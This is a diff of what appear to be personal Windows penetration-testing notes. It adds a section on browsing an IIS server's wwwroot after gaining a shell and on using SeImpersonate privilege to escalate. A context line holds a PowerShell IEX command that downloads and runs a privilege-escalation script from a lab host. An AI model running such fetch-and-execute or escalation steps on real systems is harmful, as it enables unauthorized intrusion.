@@ -168,6 +168,17 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/Pri
 ```
 
 
+## IIS Server
+```
+Generally what we do when we are on a Web Server
+We try to go into the www directory
+cd \inetpub
+cd wwwroot 
+
+Cuz if we get a shell as IIS chances are we will be having SE Impersonate Privilege which will allow us to escalate.
+```
+
+
 ## How to run the .exe file in kali linux
 ILSpy is the **open-source .** **NET assembly browser and decompiler**
 
